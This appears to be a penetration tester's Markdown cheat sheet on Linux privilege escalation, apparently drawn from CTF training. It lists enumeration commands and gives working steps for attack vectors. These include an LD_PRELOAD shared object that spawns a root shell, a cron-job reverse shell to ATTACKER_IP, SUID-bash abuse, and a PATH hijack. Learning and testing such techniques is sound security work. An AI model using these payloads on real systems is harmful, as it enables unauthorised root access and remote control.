# Linux Privilege Escalation

## Enumeration
- [ ] `hostname`
- [ ] `uname -a`
- [ ] Information about the processes and the target: `cat /proc/version` `/etc/issue` 
- [ ] All processes running on the target: `ps -A` , Process tree: `ps axjf`
- [ ] Environment variables `env`
- [ ] List all commands your user can run using sudo `sudo -l`
- [ ] `ls` `id` 
- [ ] Discover users on the system: `cat /etc/passwd` >> to beautify output `cat /etc/passwd | cut -d ":" -f 1`
- [ ] `history`

- Network 
- [ ] `ifconfig`
- [ ] `ip route`
- Netstat Commands
    - `netstat -a`: Shows all listening ports and established connections.
    - `netstat -l`: list ports in "listening" mode. 
    - `netstat -s`: list network usage statistics by protocol.
    - `netstat -tp`: list connections with the service name and PID information.
    - `netstat -i`: Shows interface statistics. 
    - `netstat -ano` could be broken down as follows:
        -a: Display all sockets
        -n: Do not resolve names
        -o: Display timers
- find Command
    - `find . -name flag1.txt` search about flag1.txt in the current directory
    - `find / -type d -name config` find the directory named config under "/"
    - `find / -type f -perm 0777` find files with the 777 permissions (files readable, writable, and executable by all users)
    - `find / -perm a=x` find executable files
    - `find /home -user frank` find all files for user "frank" under "/home"
    - `find / -mtime 10` find files that were modified in the last 10 days
    - `find / -atime 10` find files that were accessed in the last 10 day
    - `find / -cmin -60` find files changed within the last hour (60 minutes)
    - `find / -amin -60` find files accesses within the last hour (60 minutes)
    - `find / -size 50M` find files with a 50 MB size
    - `find / -name gcc*`
- Folders and files that can be written to or executed from:
    - `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
## Automated Tools 
-   LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-   LinEnum: https://github.com/rebootuser/LinEnum
-   LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-   Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-   Linux Priv Checker: https://github.com/linted/linuxprivchecker 

## SUDO 
- The sudo command, by default, allows you to run a program with root privileges.
- Any user can check its current situation related to root privileges using the `sudo -l` command. 
### Leverage LD_PRELOAD
- LD_PRELOAD is a function that allows any program to use shared libraries.
- If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.
- The steps of this privilege escalation vector can be summarized as follows:

    1. Check for LD_PRELOAD (with the env_keep option)
    2. Write a simple C code compiled as a share object (.so extension) file
    3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

- We can now use this shared object file when launching any program our user can run with sudo. In our case ,Apache2, find, or almost any of the programs we can run with sudo can be used.

- We need to run the program by specifying the LD_PRELOAD option, as follows:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

## SUID

- `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
 
 ## Capabilities
 - `getcap -r / 2>/dev/null`

## Cron Jobs
- `cat /etc/crontab`
- [ ] Make a reverse shell
In cronjobfile.sh
```
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/LISTENER_PORT 0>&1
```
- [ ] we just need to give suid permission to /bin/bash, then we can run it and become root. We will use the chmod command to give suid permission.
- In cronjobfile.sh
```
#!/bin/bash
chmod u+s /bin/bash #u+s is used give SUID permission
```
- `chmod 777 cronjobfile.sh`
- `/bin/bash -p`

## PATH

- Steps:
1. Make file path_exp.c
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0); 
  system("love");
}
```
2. We compile this into an executable and set the SUID bit. 
    - `gcc path_exp.c -o path -w`
    - `chmod u+s path`
3. - `echo $PATH`
- A simple search for writable folders can done using the  `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
- The folder that will be easier to write to is probably /tmp. In almost cases; because /tmp is not present in PATH so we will need to add it. the `export PATH=/tmp:$PATH` command accomplishes this.
4. 
- `cd /tmp`
- `echo "/bin/bash" > love`
- `chmod 777 love`
- `./path`
## Exploitation
- [ ] Kernal Exploits (preferred to leave it to t"he end)
- [ ] SUDO
- [ ] SUID
- [ ] Capabilities
- [ ] Cron Jobs
- [ ] 




# Resources 
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://gtfobins.github.io/
